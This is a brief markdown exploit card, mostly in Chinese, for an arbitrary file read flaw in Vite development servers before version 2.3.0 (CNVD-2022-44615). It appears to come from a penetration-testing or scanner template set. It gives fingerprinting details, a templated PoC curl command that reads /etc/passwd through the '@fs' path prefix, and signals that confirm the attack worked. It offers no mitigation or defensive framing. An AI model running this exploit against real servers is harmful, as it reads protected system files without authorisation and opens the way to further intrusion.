# Vite Arbitrary File Read (CNVD-2022-44615)

## 指纹特征
- 服务: Vite 开发服务器
- 版本: < 2.3.0
- 端口: 3000

## 利用矩阵
| 触发方式 | 路径 | 权限要求 |
| :--- | :--- | :--- |
| @fs 遍历读取 | `/@fs/{{FILE_PATH}}` | 无 |

## PoC 指令

通过使用标准 `@fs` 前缀读取文件系统任意文件：

```bash
curl "http://{{TARGET}}:3000/@fs/etc/passwd"
```

## Success Signal
- **文件读取**: 响应 Body 包含目标文件内容。
- **状态验证**: 成功读取受限目录之外的文件。
